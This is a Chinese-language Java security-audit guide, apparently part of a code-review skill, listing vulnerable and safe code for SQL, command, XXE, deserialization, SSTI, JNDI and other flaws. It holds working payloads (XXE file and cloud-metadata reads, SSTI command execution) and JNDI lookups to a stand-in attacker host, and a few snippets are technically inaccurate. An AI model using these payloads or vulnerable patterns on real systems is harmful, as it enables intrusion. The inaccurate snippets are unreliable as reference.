# Java 漏洞指南

Java 应用程序中常见的漏洞类型，包含对应的危险 API、模式和实际案例。

## 如何使用

审计 Java/Kotlin 代码时查阅本指南。将发现的漏洞与这些模式进行匹配，追踪 Source → Sink 链。

---

## 1. SQL 注入

**严重程度**: 严重 (CVSS 9.0+) | **可利用**: 是

### 危险 API/模式

| API | 模式 | 风险 |
|-----|------|------|
| `Statement.executeQuery()` | 字符串拼接 | 🔴 严重 |
| `Statement.execute()` | 动态 SQL | 🔴 严重 |
| `Connection.prepareStatement()` | 带拼接 | 🟡 中等 |
| `createQuery()` (Hibernate) | HQL 拼接 | 🔴 严重 |
| `@Query` 注解 | JPQL 拼接 | 🔴 严重 |

### 漏洞代码示例

```java
// 漏洞：Statement 拼接
String userId = request.getParameter("id");
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("SELECT * FROM users WHERE id=" + userId);

// 漏洞：PreparedStatement 拼接（仍然有漏洞！）
String name = request.getParameter("name");
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE name='" + name + "'");

// 漏洞：Hibernate HQL
String email = request.getParameter("email");
Query q = session.createQuery("FROM User WHERE email='" + email + "'");

// 漏洞：注解中的 JPQL
@Query("SELECT u FROM User u WHERE u.name = '" + name + "'")
List<User> findByName(String name);

// 安全：正确的参数化查询
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id=?");
ps.setString(1, userId);
ResultSet rs = ps.executeQuery();

// 安全：JPA Repository
List<User> findById(Long id);
```

### 审计检查清单

- [ ] 搜索 `Statement.executeQuery|Statement.execute`
- [ ] 搜索 `Query|createQuery|createNativeQuery`
- [ ] 搜索带字符串拼接的 `@Query` 注解
- [ ] 追踪用户输入到 SQL 查询

---

## 2. 命令注入

**严重程度**: 严重 (CVSS 9.8) | **可利用**: 是 (远程代码执行)

### 危险 API

| API | 模式 | 风险 |
|-----|------|------|
| `Runtime.exec()` | 单字符串参数 | 🔴 严重 |
| `ProcessBuilder` | 用户输入进入命令 | 🔴 严重 |
| `java.lang.ProcessBuilder` | start() 含不可信输入 | 🔴 严重 |

### 漏洞代码示例

```java
// 漏洞：Runtime.exec 字符串
String cmd = request.getParameter("cmd");
Runtime.getRuntime().exec(cmd);

// 漏洞：ProcessBuilder 但用户输入
String file = request.getParameter("file");
ProcessBuilder pb = new ProcessBuilder("cat", file);
pb.start();

// 漏洞：Shell 元字符注入
String host = request.getParameter("host");
Runtime.getRuntime().exec("ping -c 4 " + host + " && ls");

// 漏洞：Windows 命令注入
String dir = request.getParameter("dir");
Runtime.getRuntime().exec("cmd /c dir " + dir);

// 安全：严格白名单
if (!Pattern.matches("^[a-zA-Z0-9]+$", input)) {
    throw new IllegalArgumentException("Invalid input");
}
Runtime.getRuntime().exec(new String[]{"ls", input});
```

### 审计检查清单

- [ ] 搜索 `Runtime.exec|ProcessBuilder`
- [ ] 追踪用户输入到进程命令
- [ ] 检查元字符过滤
- [ ] 验证命令数组 vs 单字符串

---

## 3. XXE (XML 外部实体)

**严重程度**: 高 (CVSS 8.0+) | **可利用**: 是 (文件读取, SSRF)

### 危险 API

| API | 模式 | 风险 |
|-----|------|------|
| `DocumentBuilder` | 无安全设置 | 🔴 严重 |
| `SAXParser` | 默认配置 | 🔴 严重 |
| `XMLInputFactory` | 无安全设置 | 🔴 严重 |
| `XMLStreamReader` | 默认设置 | 🔴 严重 |
| `TransformerFactory` | 无安全设置 | 🔴 严重 |
| `SchemaFactory` | 无安全设置 | 🔴 严重 |

### 漏洞代码示例

```java
// 漏洞：默认设置的 DocumentBuilder
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(new InputSource(new StringReader(xml)));

// 漏洞：SAXParser
SAXParserFactory spf = SAXParserFactory.newInstance();
SAXParser parser = spf.newSAXParser();
parser.parse(new InputSource(new StringReader(xml)), handler);

// 漏洞：XMLInputFactory
XMLInputFactory factory = XMLInputFactory.newInstance();
XMLStreamReader reader = factory.createXMLStreamReader(xml);

// 漏洞：dom4j（常用库）
SAXReader reader = new SAXReader();
Document doc = reader.read(new StringReader(xml));

// 安全：安全的 DocumentBuilder
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
```

### XXE 载荷

```xml
<!-- 文件读取 -->
<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- SSRF -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

### 审计检查清单

- [ ] 搜索 `DocumentBuilderFactory|SAXParserFactory|XMLInputFactory`
- [ ] 检查安全特性设置
- [ ] 验证 `ACCESS_EXTERNAL_*` 属性设置
- [ ] 使用常见载荷测试 XXE

---

## 4. 反序列化

**严重程度**: 严重 (CVSS 9.0+) | **可利用**: 是 (通过 gadget 链 RCE)

### 危险 API

| API | 模式 | 风险 |
|-----|------|------|
| `ObjectInputStream.readObject()` | 不可信数据 | 🔴 严重 |
| `XMLDecoder.readObject()` | 来自用户输入 | 🔴 严重 |
| `XStream.fromXML()` | 无安全框架 | 🔴 严重 |
| `JSON.parseObject()` (Fastjson) | 多版本 | 🔴 严重 |
| `Yaml.load()` (SnakeYAML) | 不可信 YAML | 🔴 严重 |
| `ObjectMapper.readValue()` | 含类型类 | 🟡 中等 |

### 漏洞代码示例

```java
// 漏洞：ObjectInputStream
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject();

// 漏洞：无安全的 XStream
XStream xstream = new XStream();
xstream.fromXML(request.getParameter("data"));

// 漏洞：Fastjson
JSON.parseObject(request.getParameter("json"), User.class);

// 漏洞：SnakeYAML
Yaml yaml = new Yaml();
Object obj = yaml.load(request.getParameter("yaml"));

// 漏洞：XMLDecoder
XMLDecoder decoder = new XMLDecoder(request.getInputStream());
Object obj = decoder.readObject();

// 安全：带验证的 ObjectInputStream
ObjectInputStream ois = new CustomObjectInputStream(inputStream);
ois.setAllowedClasses(...);

// 安全：带安全框架的 XStream
XStream xstream = new XStream();
xstream.addPermission(NullPermission.NULL);
xstream.addPermission(PrimitiveTypePermission.PRIMITIVES);
```

### 需要搜索的 Gadget 链

- Apache Commons Collections: `Transformer`, `InvokerTransformer`
- Apache Commons BeanUtils: `BeanComparator`
- Spring Framework: `AnnotationInvocationHandler`
- Jackson databind: `TemplatesImpl` gadget

### 审计检查清单

- [ ] 搜索 `ObjectInputStream|readObject`
- [ ] 搜索 `XStream.fromXML|JSON.parseObject|Yaml.load`
- [ ] 识别依赖中的 gadget 链库
- [ ] 检查类中的 `readResolve`, `finalize` 方法

---

## 5. 路径穿越

**严重程度**: 高 (CVSS 7.5) | **可利用**: 是 (文件读写)

### 危险 API

| API | 模式 | 风险 |
|-----|------|------|
| `FileInputStream` | 用户路径 | 🔴 严重 |
| `FileOutputStream` | 用户路径 | 🔴 严重 |
| `Files.readAllLines()` | 用户路径 | 🔴 严重 |
| `Paths.get()` | 用户输入 | 🔴 严重 |
| `File` 构造函数 | 用户输入 | 🔴 严重 |
| `new FileInputStream()` | 直接使用 | 🔴 严重 |

### 漏洞代码示例

```java
// 漏洞：文件读取中的路径穿越
String file = request.getParameter("file");
FileInputStream fis = new FileInputStream("/var/www/uploads/" + file);

// 漏洞：规范化绕过的路径穿越
String doc = request.getParameter("doc");
File f = new File(doc);
String canonical = f.getCanonicalPath();
if (!canonical.startsWith("/var/docs/")) { // 通过符号链接绕过
    throw new SecurityException();
}

// 漏洞：ZIP slip（归档中的路径穿越）
ZipEntry entry = zipFile.getNextZipEntry();
String destPath = "/output/" + entry.getName();
new File(destPath).mkdirs();

// 漏洞：请求分发器路径
String path = request.getParameter("page");
request.getRequestDispatcher(path).forward(request, response);

// 安全：路径规范化和验证
Path base = Paths.get("/var/www/uploads").toAbsolutePath().normalize();
Path requested = base.resolve(file).normalize();
if (!requested.startsWith(base)) {
    throw new SecurityException();
}
```

### 审计检查清单

- [ ] 搜索 `FileInputStream|FileOutputStream|Files.readAllLines`
- [ ] 搜索 `Paths.get|File.new`
- [ ] 检查路径验证逻辑
- [ ] 测试 `../` 和 URL 编码绕过

---

## 6. SSRF (服务器端请求伪造)

**严重程度**: 高 (CVSS 8.6-9.0) | **可利用**: 是 (内网访问)

### 危险 API

| API | 模式 | 风险 |
|-----|------|------|
| `HttpClient.send()` | 用户 URL | 🔴 严重 |
| `URL.openConnection()` | 用户 URL | 🔴 严重 |
| `OkHttpClient` | 用户 URL | 🔴 严重 |
| `RestTemplate` | 用户 URL | 🔴 严重 |
| `WebClient` (Spring) | 用户 URL | 🔴 严重 |
| `ImageIO.read()` | 用户 URL | 🔴 严重 |

### 漏洞代码示例

```java
// 漏洞：用户提供的 URL
String url = request.getParameter("url");
HttpClient client = HttpClient.newHttpClient();
HttpRequest req = HttpRequest.newBuilder(URI.create(url)).build();
HttpResponse<String> resp = client.send(req, BodyHandlers.ofString());

// 漏洞：RestTemplate 用用户 URL
RestTemplate rt = new RestTemplate();
String result = rt.getForObject(url, String.class);

// 漏洞：URL.openConnection
URL url = new URL(request.getParameter("src"));
URLConnection conn = url.openConnection();
InputStream in = conn.getInputStream();

// 漏洞：ImageIO 用用户 URL
File img = new File(request.getParameter("image"));
BufferedImage bi = ImageIO.read(img);

// 攻击目标：
// http://169.254.169.254/latest/meta-data/ (AWS 元数据)
// http://localhost:8080/admin (内网管理)
// file:///etc/passwd (本地文件)
```

### 审计检查清单

- [ ] 搜索 `HttpClient|URL.openConnection|OkHttpClient|RestTemplate`
- [ ] 追踪 URL 参数到 HTTP 调用
- [ ] 检查白名单实现
- [ ] 测试内网 IP 段

---

## 7. SSTI (服务端模板注入)

**严重程度**: 严重 (CVSS 9.0+) | **可利用**: 是 (RCE)

### 危险模板引擎

| 引擎 | API | 风险 |
|------|-----|------|
| Freemarker | `Template.process()` | 🔴 严重 |
| Velocity | `Velocity.evaluate()` | 🔴 严重 |
| Thymeleaf | `TemplateEngine.process()` | 🟡 中等（视上下文） |
| Pebble | `PebbleEngine.evaluate()` | 🔴 严重 |
| Jinjava | `Jinjava.render()` | 🔴 严重 |

### 漏洞代码示例

```java
// 漏洞：Freemarker 用户输入进模板
Template template = new Template("name", userInput, config);
template.process(data, writer);

// 漏洞：Velocity 用户输入
Velocity.evaluate(context, writer, "vm", userTemplate);

// 漏洞：StringTemplate 用户输入
ST st = new ST(userInput, '$', '}');
st.add("data", userData);
String result = st.render();

// 漏洞：Pebble
PebbleEngine engine = new PebbleEngine();
PebbleTemplate template = engine.getTemplate(userInput);
template.evaluate(context, writer);

// 安全：模板与数据分离
Template template = new Template("name", fixedTemplate, config);
template.process(data, writer);
```

### SSTI 载荷 (Freemarker)

```java
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ex("id")}
```

### SSTI 载荷 (Velocity)

```java
#set($e = $context.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null))
$e.exec("id")
```

### 审计检查清单

- [ ] 搜索 `Template.process|Velocity.evaluate|TemplateEngine.process`
- [ ] 识别含用户输入的模板编译/渲染
- [ ] 按引擎测试 RCE 载荷
- [ ] 检查模板沙箱

---

## 8. 认证 / 会话漏洞

**严重程度**: 视情况 (CVSS 4.0-9.8) | **可利用**: 是

### 常见漏洞模式

| 问题 | 漏洞代码 | 风险 |
|------|----------|------|
| JWT none 算法 | `Algorithm.none()` | 🔴 严重 |
| 弱 JWT 密钥 | `HS256("secret")` | 🔴 暴力破解 |
| JWT kid 注入 | `kid` 来自用户输入 | 🔴 密钥混淆 |
| 会话固定 | `request.getSession(true)` | 🟡 劫持 |
| 可预测会话 | `session.setAttribute("token", UUID.randomUUID())` | 🟢 低（如果随机） |

### 漏洞代码示例

```java
// 漏洞：JWT none 算法
Algorithm algorithm = Algorithm.none();
JWTVerifier verifier = JWT.require(algorithm).build();
decoded = verifier.verify(token);

// 漏洞：弱密钥
Key key = new SecretKeySpec("secret".getBytes(), "HmacSHA256");
Algorithm alg = Algorithm.HMAC256(key);

// 漏洞：kid 头注入
Map<String, Object> headers = new HashMap<>();
headers.put("kid", request.getParameter("kid"));
Algorithm algorithm = Algorithm.HMAC256(key);
JWT.create()
    .withPayload(payload)
    .withHeader(headers)
    .sign(algorithm);

// 漏洞：无盐密码哈希
MessageDigest md = MessageDigest.getInstance("MD5");
byte[] hash = md.digest(password.getBytes());

// 安全：强 JWT 密钥
Key key = new SecretKeySpec(randomBytes(256), "HmacSHA256");

// 安全：bcrypt 密码哈希
BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();
String hash = encoder.encode(password);
```

### 审计检查清单

- [ ] 搜索 `Algorithm.none|JWT.create|JWTVerifier`
- [ ] 检查 JWT 密钥强度
- [ ] 验证令牌验证逻辑
- [ ] 追踪会话创建

---

## 9. LDAP 注入

**严重程度**: 高 (CVSS 8.0+) | **可利用**: 是

### 危险 API

| API | 模式 | 风险 |
|-----|------|------|
| `DirContext.search()` | DN 中用户输入 | 🔴 严重 |
| `LdapTemplate.search()` | 带拼接 | 🔴 严重 |
| `NamingEnumeration` | 用户输入 | 🔴 严重 |

### 漏洞代码示例

```java
// 漏洞：LDAP 注入
String user = request.getParameter("username");
String filter = "(uid=" + user + ")";
ctx.search("ou=users", filter, controls);

// 漏洞：通配符注入
String name = request.getParameter("name");
String filter = "(cn=" + name + "*))";
// 输入: *)(cn=*))(|(cn=* → 绕过

// 安全：转义输入
String escape = user.replace("\\", "\\\\")
                      .replace("*", "\\2a")
                      .replace("(", "\\28")
                      .replace(")", "\\29");
String filter = "(uid=" + escape + ")";

// 安全：参数化搜索
searchControls.setReturningAttributes(new String[]{"cn", "mail"});
NamingEnumeration<SearchResult> results = ctx.search(
    "ou=users", "(uid={0})", new Object[]{user}, searchControls);
```

### 审计检查清单

- [ ] 搜索 `DirContext.search|LdapTemplate.search`
- [ ] 识别 LDAP 查询构建
- [ ] 检查输入转义
- [ ] 测试过滤器注入

---

## 10. JNDI 注入 / 日志注入

**严重程度**: 严重 (CVSS 9.0+) | **可利用**: 是 (RCE)

### 危险 API

| API | 模式 | 风险 |
|-----|------|------|
| `InitialContext.lookup()` | 用户输入 | 🔴 严重 |
| `doLookup()` (Spring) | 用户输入 | 🔴 严重 |
| `logger.info()` | 用户输入 | 🟡 信息泄露 |

### 漏洞代码示例

```java
// 漏洞：JNDI 注入
String name = request.getParameter("name");
Context ctx = new InitialContext();
Object obj = ctx.lookup("rmi://attacker/" + name);

// 漏洞：Spring JNDI
JndiObjectFactoryBean bean = new JndiObjectFactoryBean();
bean.setJndiName("ldap://attacker:1389/" + name);

// 漏洞：日志注入（换行注入）
logger.info("User: " + userInput);
// 输入: admin\nINFO: RCE 载荷

// 安全：带验证的 Context.lookup
if (!Pattern.matches("^[a-zA-Z0-9]+$", name)) {
    throw new IllegalArgumentException("Invalid name");
}
ctx.lookup("rmi://legitimate-server/" + name);
```

### 审计检查清单

- [ ] 搜索 `InitialContext.lookup|doLookup`
- [ ] 追踪 JNDI 名称构建
- [ ] 检查输入验证
- [ ] 测试换行符日志注入

---

## 快速参考：Source → Sink 模式

| Source | Sink | 漏洞类型 |
|--------|------|----------|
| `request.getParameter()` | `Statement.executeQuery()` | SQL 注入 |
| `request.getParameter()` | `Runtime.exec()` | 命令注入 |
| `request.getParameter()` | `DocumentBuilder.parse()` | XXE |
| `request.getParameter()` | `ObjectInputStream.readObject()` | 反序列化 |
| `request.getParameter()` | `FileInputStream()` | 路径穿越 |
| `request.getParameter()` | `HttpClient.send()` | SSRF |
| `request.getParameter()` | `Template.process()` | SSTI |
| `request.getParameter()` | `ctx.lookup()` | JNDI 注入 |

---

## Spring Framework 特定问题

| 问题 | 模式 | 风险 |
|------|------|------|
| SpEL 注入 | `SpelExpressionParser` 含用户输入 | 🔴 RCE |
| Spring Security 错误配置 | `.permitAll()` 在敏感端点 | 🔴 认证绕过 |
| CORS 错误配置 | `.allowedOrigins("*")` | 🟡 数据泄露 |
| 批量赋值 | `@ModelAttribute` 绑定实体 | 🟡 权限提升 |

### Spring 审计检查清单

- [ ] 搜索 `SpelExpressionParser`
- [ ] 检查 `.permitAll()` 和 `.hasRole()` 使用
- [ ] 验证 CORS 配置
- [ ] 审查 `@ModelAttribute` 绑定

---

## 相关参考

- **Skill**: `SKILL.md` (主审计工作流程)
- **Templates**: `templates/vulnerability-report-template.md`
